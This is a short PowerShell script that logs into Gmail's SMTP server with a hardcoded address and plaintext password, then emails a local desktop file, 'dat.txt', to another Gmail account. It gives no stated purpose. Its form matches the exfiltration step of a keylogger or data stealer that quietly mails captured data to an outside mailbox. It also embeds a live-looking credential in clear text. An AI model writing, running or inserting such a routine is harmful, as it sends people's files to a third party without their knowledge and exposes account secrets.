$Message = new-object Net.Mail.MailMessage 
$smtp = new-object Net.Mail.SmtpClient("smtp.gmail.com", 587) 
$smtp.Credentials = New-Object System.Net.NetworkCredential("jmgywl@gmail.com", "ulowcnty"); 
$smtp.EnableSsl = $true 
$smtp.Timeout = 400000  
$Message.From = "jmgywl@gmail.com" 
$Message.To.Add("yqltndk@gmail.com") 
$Message.Attachments.Add("C:\users\mathi\desktop\c\dat.txt") 
$smtp.Send($Message)